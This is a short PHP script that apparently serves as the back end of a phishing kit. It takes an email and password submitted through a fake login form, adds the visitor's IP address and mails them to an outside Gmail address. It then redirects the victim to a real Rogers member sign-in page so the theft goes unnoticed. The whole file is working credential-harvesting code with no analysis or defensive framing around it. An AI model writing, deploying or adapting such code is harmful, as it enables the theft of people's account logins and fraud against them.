<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || other coinbxe log GOD 1ST SON || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="j.golden10001@gmail.com";
$subject = "tare other mail | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://rogersmembercentre.com/rmcapp/remc.html?fbclid=IwAR1Q-HOR_Iviqojo3-lXCZQeXJVjjAuCu8RCPOSUau1PsCstPPKGC0KlHyA#/signin");
?>